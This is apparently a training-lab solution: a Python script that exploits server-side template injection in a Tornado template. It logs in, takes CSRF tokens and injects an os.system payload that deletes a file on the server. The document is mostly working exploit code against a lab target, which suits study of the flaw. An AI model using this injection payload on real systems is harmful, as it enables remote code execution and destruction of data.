# Basic server-side template injection (code context)
> This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
from bs4 import BeautifulSoup
import sys

# --- CONFIGURATION ---
# Target: Basic server-side template injection (code context)
# Note: Ensure no trailing slash in BASE_URL for clean concatenation
BASE_URL = "https://0a6100f0045d551580bdda180082001b.web-security-academy.net/"

def get_csrf_token(session, url):
    """
    Helper function to extract CSRF token from a given URL.
    Assumes the token exists; will raise an error if not found.
    """
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find("input", {"name": "csrf"})['value']

def exploit_tornado_ssti(target_base_url):
    """
    Exploits a Code Context SSTI in the 'Preferred Name' functionality.
    
    Attack Chain:
    1. Authenticate as a valid user.
    2. Extract a fresh CSRF token.
    3. Inject Python payload via the 'blog-post-author-display' parameter.
    4. Verify execution via the rendered exit code.
    """
    
    # Define Endpoints
    login_endpoint = f"{target_base_url}/login"
    account_endpoint = f"{target_base_url}/my-account"
    target_endpoint = f"{target_base_url}/my-account/change-blog-post-author-display"
    
    session = requests.Session()
    
    # --- PHASE 1: AUTHENTICATION ---
    print(f"[*] Initiating login sequence at {login_endpoint}...")
    
    # 1.1: Get Login CSRF and Login
    login_csrf = get_csrf_token(session, login_endpoint)
    
    credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": login_csrf
    }
    auth_response = session.post(login_endpoint, data=credentials)
    
    # Simple logic check for login success
    if "Log out" in auth_response.text:
        print("[+] Login Successful. Session established.")
    
        # --- PHASE 2: PAYLOAD INJECTION ---
        print("[*] Preparing payload injection...")
        
        # 2.1: Get Exploit CSRF (Token rotates on new page)
        exploit_csrf = get_csrf_token(session, account_endpoint)
        
        # 2.2: Construct Payload
        # We use {{ }} to force evaluation and __import__ to load 'os' dynamically.
        # system() returns '0' on success.
        command = "rm /home/carlos/morale.txt"
        payload_string = f"{{{{__import__('os').system('{command}')}}}}"
        
        payload_data = {
            "blog-post-author-display": payload_string,
            "csrf": exploit_csrf
        }
        
        # 2.3: Execute Attack
        print(f"[*] Sending Payload: {payload_string}")
        attack_response = session.post(target_endpoint, data=payload_data)
        
        # --- PHASE 3: VERIFICATION ---
        # Check for the exit code '0' in the response body
        if "0" in attack_response.text:
            print("[+] SUCCESS: Exit code '0' detected. Target file deleted.")
        elif "Congratulations" in attack_response.text:
            print("[+] SUCCESS: Lab solved banner detected.")
        else:
            print("[-] Payload sent. Verify manually.")

if __name__ == "__main__":
    exploit_tornado_ssti(BASE_URL)
```